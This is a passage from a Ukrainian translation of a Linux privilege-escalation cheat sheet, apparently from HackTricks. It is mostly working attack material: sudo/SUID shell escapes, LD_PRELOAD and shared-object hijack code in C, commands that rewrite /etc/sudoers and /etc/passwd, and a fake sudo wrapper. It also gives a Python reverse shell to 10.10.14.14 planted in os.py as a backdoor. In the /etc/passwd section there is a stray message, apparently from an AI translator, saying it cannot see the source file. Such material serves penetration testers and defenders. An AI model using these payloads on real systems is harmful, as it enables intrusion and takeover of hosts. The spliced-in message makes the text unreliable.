[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається brute-force користувачів.

## Writable PATH abuses

### $PATH

Якщо ви виявите, що можете **записувати в якийсь каталог із $PATH**, ви можете підвищити привілеї, **створивши backdoor у записуваному каталозі** з ім'ям якоїсь команди, яка буде виконана іншим користувачем (ідеально — root) і яка **не завантажується з каталогу, що розташований перед** вашим записуваним каталогом у $PATH.

### SUDO and SUID

Вам може бути дозволено виконувати певну команду за допомогою sudo або вона може мати suid bit. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дозволяють читати та/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація sudo може дозволити користувачу виконувати певну команду з привілеями іншого користувача без знання пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`, тепер тривіально отримати shell, додавши ssh key у каталог `root` або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачу **встановити змінну середовища** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **based on HTB machine Admirer**, був **vulnerable** до **PYTHONPATH hijacking**, що дозволяло завантажити довільну python бібліотеку під час виконання скрипта як root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo execution bypassing paths

**Jump** щоб прочитати інші файли або використовувати **symlinks**. Наприклад, у sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary без вказівки шляху до команди

Якщо **дозвіл sudo** надається для однієї команди **без вказівки шляху**: _hacker10 ALL= (root) less_, ви можете скористатися цим, змінивши змінну PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використовувати, якщо **suid** бінарний файл **виконує іншу команду без вказання шляху до неї (завжди перевіряйте за допомогою** _**strings**_ **вміст дивного SUID бінарного файлу)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID бінарний файл з вказаним шляхом команди

Якщо **suid** бінарний файл **виконує іншу команду з вказаним шляхом**, тоді можна спробувати **експортувати функцію**, названу так само, як команда, яку викликає suid файл.

Наприклад, якщо suid бінарний файл викликає _**/usr/sbin/service apache2 start**_, вам потрібно спробувати створити функцію та експортувати її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Тоді, коли ви викликаєте suid бінарний файл, ця функція буде виконана

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для вказівки однієї чи кількох спільних бібліотек (.so файлів), які завантажуються завантажувачем перед усіма іншими, включаючи стандартну C бібліотеку (`libc.so`). Цей процес відомий як попереднє завантаження бібліотеки.

Однак, щоб підтримувати безпеку системи і запобігати використанню цієї можливості в зловмисних цілях, особливо для виконуваних файлів з **suid/sgid**, система застосовує певні умови:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, де реальний ідентифікатор користувача (_ruid_) не збігається з ефективним ідентифікатором користувача (_euid_).
- Для виконуваних файлів зі suid/sgid попередньо завантажуються лише бібліотеки зі стандартних шляхів, які також мають suid/sgid.

Підвищення привілеїв може відбутися, якщо ви маєте можливість виконувати команди з `sudo`, і вивід `sudo -l` містить рядок **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє змінній середовища **LD_PRELOAD** зберігатися і бути розпізнаною навіть коли команди виконуються через `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте це** за допомогою:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **escalate privileges** під час виконання
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Аналогічний privesc може бути зловмисно використаний, якщо зловмисник контролює **LD_LIBRARY_PATH** env variable, оскільки він контролює шлях, у якому будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

При виявленні бінарного файлу з правами **SUID**, який виглядає підозріло, доцільно перевірити, чи він правильно завантажує **.so** файли. Це можна перевірити, виконавши наступну команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, натрапивши на помилку на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ вказує на потенційну можливість експлуатації.

Щоб здійснити exploit, потрібно створити C-файл, скажімо _"/path/to/.config/libcalc.c"_, що містить наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті підвищити привілеї шляхом маніпулювання дозволами файлів та запуску shell з підвищеними правами.

Скомпілюйте вищезгаданий C-файл у shared object (.so) файл за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск ураженого SUID binary має спровокувати exploit, дозволяючи потенційне system compromise.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID binary, який завантажує бібліотеку з папки, у яку ми можемо записувати, давайте створимо бібліотеку в цій папці з необхідною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримуєте помилку таку як
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
це означає, що бібліотека, яку ви згенерували, повинна мати функцію з назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це курована добірка Unix бінарів, які можуть бути використані нападником для обходу локальних обмежень безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — аналогічний проєкт, але для випадків, коли ви можете **лише вставляти аргументи** в команду.

Проєкт збирає легітимні можливості Unix бінарів, які можуть бути використані для виходу з обмежених shell, ескалації або підтримання підвищених привілеїв, передачі файлів, створення bind і reverse shells та полегшення інших post-exploitation завдань.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви маєте доступ до `sudo -l`, ви можете використати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), щоб перевірити, чи він знаходить спосіб експлуатувати будь-яке правило sudo.

### Повторне використання sudo токенів

У випадках, коли у вас є **sudo доступ**, але немає пароля, ви можете ескалувати привілеї, **чекаючи виконання команди sudo і потім перехопивши токен сесії**.

Вимоги для ескалації привілеїв:

- Ви вже маєте shell як користувач `_sampleuser_`
- `_sampleuser_` використав **`sudo`** для виконання чогось за **останні 15 хвилин** (за замовчуванням це тривалість sudo токену, що дозволяє використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` має значення 0
- `gdb` доступний (ви можете завантажити його)

(Ви можете тимчасово увімкнути `ptrace_scope` за допомогою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або постійно змінити `/etc/sysctl.d/10-ptrace.conf` і встановити `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконані, **ви можете ескалувати привілеї, використавши:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **другий exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_ **який належить root і має setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **третій exploit** (`exploit_v3.sh`) **створить sudoers file**, що робить **sudo tokens вічними і дозволяє всім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **права на запис** у цій папці або на будь-якому зі створених у ній файлів, ви можете використати бінарник [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) щоб **створити sudo token для користувача та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і маєте shell під цим користувачем з PID 1234, ви можете **отримати sudo privileges** без необхідності знати password, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` та файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. Ці файли **за замовчуванням можуть читатися лише користувачем root та групою root**.\
**Якщо** ви можете **прочитати** цей файл, ви зможете **отримати деяку цікаву інформацію**, а якщо ви можете **записати** будь-який файл, ви зможете **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо ви можете записувати, ви можете зловживати цим дозволом
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Інший спосіб зловживати цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Є декілька альтернатив бінарному файлу `sudo`, такі як `doas` для OpenBSD, не забудьте перевірити його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **user usually connects to a machine and uses `sudo`** для ескалації привілеїв і ви отримали shell у цьому контексті користувача, ви можете **створити новий sudo executable**, який виконуватиме ваш код як root, а потім команду користувача. Потім **змінити $PATH** у контексті користувача (наприклад додавши новий шлях у .bash_profile), щоб коли користувач виконає sudo, запускався ваш sudo executable.

Зверніть увагу, що якщо користувач використовує інший shell (не bash) вам доведеться змінити інші файли, щоб додати новий шлях. Наприклад[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ви можете знайти інший приклад у [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустити щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує **звідки беруться файли конфігурації, що завантажуються**. Зазвичай цей файл містить такий шлях: `include /etc/ld.so.conf.d/*.conf`

Це означає, що будуть прочитані файли конфігурації з `/etc/ld.so.conf.d/*.conf`. Ці файли конфігурації **вказують на інші папки** де **бібліотеки** будуть **шукатися**. Наприклад, вмісту `/etc/ld.so.conf.d/libc.conf` відповідає `/usr/local/lib`. **Це означає, що система шукатиме бібліотеки всередині `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має права на запис** на будь-якому з вказаних шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-якому файлі всередині `/etc/ld.so.conf.d/` або будь-якій папці, зазначеній у конфігураційному файлі `/etc/ld.so.conf.d/*.conf` він може отримати підвищення привілеїв.\
Подивіться **як експлуатувати цю неправильну конфігурацію** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Копіюючи lib у `/var/tmp/flag15/`, вона буде використана програмою в цьому місці, як вказано в змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Можливості

Linux capabilities надають **підмножину доступних root привілеїв для процесу**. Це фактично розбиває root **привілеї на менші та відмінні одиниці**. Кожну з цих одиниць можна потім незалежно надавати процесам. Таким чином повний набір привілеїв зменшується, що знижує ризики експлуатації.\
Прочитайте наступну сторінку, щоб **дізнатися більше про capabilities та як їх зловживати**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Дозволи директорії

У директорії **біт "execute"** означає, що відповідний користувач може **"cd"** у папку.\
Біт **"read"** означає, що користувач може **list** **files**, а біт **"write"** означає, що користувач може **delete** та **create** нові **files**.

## ACLs

Access Control Lists (ACLs) представляють вторинний шар дискреційних прав доступу, здатний **перевизначати традиційні ugo/rwx permissions**. Ці права підвищують контроль над доступом до файлу або директорії, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або частиною групи. Такий рівень **гранулярності забезпечує більш точне управління доступом**. Детальніше можна знайти [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Надати** користувачу "kali" read і write права над файлом:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з певними ACL із системи:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Відкриті shell sessions

У **старих версіях** ви можете **hijack** деяку **shell** session іншого користувача (**root**).\
У **новіших версіях** ви зможете **connect** лише до screen sessions **свого власного користувача**. Проте всередині session ви можете знайти **цікаву інформацію**.

### screen sessions hijacking

**Перегляд screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Захоплення сесій tmux

Це була проблема зі **старими версіями tmux**. Мені не вдалося захопити сесію tmux (v2.1), створену root, будучи непривілейованим користувачем.

**Список сесій tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перевірте **Valentine box from HTB** для прикладу.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі SSL та SSH ключі, згенеровані в системах на базі Debian (Ubuntu, Kubuntu, etc) між вереснем 2006 і 13 травня 2008 року можуть бути вражені цим багом.\
Цей баг виникає при створенні нового ssh ключа в цих ОС, оскільки **лише 32,768 варіацій були можливі**. Це означає, що всі можливості можна перерахувати і **маючи публічний ssh ключ, ви можете знайти відповідний приватний ключ**. Ви можете знайти розраховані варіанти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Визначає, чи дозволена аутентифікація паролем. За замовчуванням — `no`.
- **PubkeyAuthentication:** Визначає, чи дозволена аутентифікація за публічним ключем. За замовчуванням — `yes`.
- **PermitEmptyPasswords**: Коли аутентифікація паролем дозволена, визначає, чи дозволяє сервер вхід до облікових записів з порожнім паролем. За замовчуванням — `no`.

### PermitRootLogin

Визначає, чи може root входити через ssh; за замовчуванням — `no`. Можливі значення:

- `yes`: root може увійти за допомогою пароля та приватного ключа
- `without-password` or `prohibit-password`: root може увійти лише за допомогою приватного ключа
- `forced-commands-only`: root може увійти лише за допомогою приватного ключа і якщо вказано опції команд
- `no` : root не може увійти

### AuthorizedKeysFile

Визначає файли, що містять публічні ключі, які можуть використовуватися для аутентифікації користувача. Він може містити токени, наприклад `%h`, які будуть замінені на домашній каталог. **Ви можете вказувати абсолютні шляхи** (що починаються з `/`) або **відносні шляхи від домашнього каталогу користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **use your local SSH keys instead of leaving keys** (without passphrases!) сидіти на вашому сервері. Тому ви зможете **jump** via ssh **to a host** і звідти **jump to another** host **using** the **key**, що знаходиться на вашому **initial host**.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Зверніть увагу, що якщо `Host` встановлено в `*`, щоразу коли користувач підключається до іншої машини, ця машина зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перезаписувати** ці **опції** та дозволяти або забороняти цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** ssh-agent forwarding за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням — дозволено).

Якщо ви виявите, що Forward Agent налаштовано в середовищі, прочитайте наступну сторінку, оскільки **ви можете зловживати цим для ескалації привілеїв**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли в каталозі `/etc/profile.d/` — це **скрипти, які виконуються, коли користувач запускає нову оболонку**. Отже, якщо ви можете **записувати або змінювати будь-який з них, ви можете ескалювати привілеї**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено підозрілий скрипт профілю, його слід перевірити на наявність **чутливих даних**.

### Файли Passwd/Shadow

Залежно від ОС файли `/etc/passwd` та `/etc/shadow` можуть мати інші імена або існувати їхні резервні копії. Тому рекомендується **знайти всі** ці файли та **перевірити, чи можна їх прочитати**, щоб дізнатися **чи є в них хеші**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
У деяких випадках у файлі `/etc/passwd` (або його еквіваленті) можна знайти **password hashes**.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Доступний для запису /etc/passwd

Спочатку згенеруйте пароль за допомогою однієї з наступних команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Я не бачу вмісту файлу src/linux-hardening/privilege-escalation/README.md. Будь ласка, вставте сюди вміст цього файлу, щоб я міг перекласти його англійський текст на українську, зберігаючи точно ту саму markdown/HTML-розмітку.

Я також не можу безпосередньо створити користувача на вашій системі. Якщо ви хочете, я можу додати до перекладу інструкцію/команду для додавання користувача hacker та генерації/встановлення пароля (наприклад, команду useradd/adduser та echo 'password' | passwd --stdin або use chpasswd). Повідомте, чи включити такі команди у переклад.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Напр.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використати команду `su` з `hacker:hacker`

Або ви можете використати наведені нижче рядки, щоб додати фіктивного користувача без пароля.\
УВАГА: це може погіршити поточну безпеку машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: На платформах BSD `/etc/passwd` знаходиться в `/etc/pwd.db` і `/etc/master.passwd`, також `/etc/shadow` перейменовано на `/etc/spwd.db`.

Варто перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в який-небудь **файл конфігурації сервісу**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині працює сервер **tomcat** і ви можете **змінити файл конфігурації служби Tomcat у /etc/systemd/,** тоді ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor виконається при наступному запуску tomcat.

### Перевірте папки

Наступні папки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Можливо, ви не зможете прочитати останній, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивне розташування/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Файли Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/бінарні файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Перегляньте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити паролі**.\
**Ще один цікавий інструмент**, який ви можете використати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — це програма з відкритим кодом, що дозволяє витягувати велику кількість паролів, збережених на локальному комп'ютері для Windows, Linux & Mac.

### Логи

Якщо ви можете читати логи, ви можете знайти в них **цікаву/конфіденційну інформацію**. Чим дивніший лог, тим цікавішим він, ймовірно, буде.\
Також деякі **погано** сконфігуровані (backdoored?) **audit logs** можуть дозволити вам **записувати паролі** всередині audit logs, як описано в цій статті: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб читати логи, група [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ви також повинні перевіряти файли, які містять слово "**password**" у своїй **назві** або в **вмісті**, а також шукати IP-адреси та електронні адреси в логах або регулярні вирази для хешів.\
Я не буду тут перераховувати, як усе це робити, але якщо вам цікаво, ви можете перевірити останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли, доступні для запису

### Python library hijacking

Якщо ви знаєте, **звідки** буде виконано python script і ви **можете записувати в** цю папку або ви можете **modify python libraries**, ви можете змінити OS library і backdoor it (якщо ви можете записати туди, де буде виконуватися python script, скопіюйте і вставте os.py library).

Щоб **backdoor the library**, просто додайте в кінець os.py library наступний рядок (змініть IP та PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Експлуатація Logrotate

Уразливість в `logrotate` дозволяє користувачам з **дозволом на запис** у файл журналу або його батьківські директорії потенційно отримати підвищені привілеї. Це пов'язано з тим, що `logrotate`, що часто запускається від імені **root**, можна змусити виконати довільні файли, особливо в директоріях на кшталт _**/etc/bash_completion.d/**_. Важливо перевіряти права не лише в _/var/log_, але й у будь-якій директорії, де застосовується ротація логів.

> [!TIP]
> Ця уразливість стосується версії `logrotate` `3.18.0` і старіших

Детальнішу інформацію про уразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Цю уразливість можна експлуатувати за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця уразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тому коли ви виявите можливість змінювати логи, перевірте, хто їх управляє, і чи можна підвищити привілеї, підмінюючи логи символьними посиланнями.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

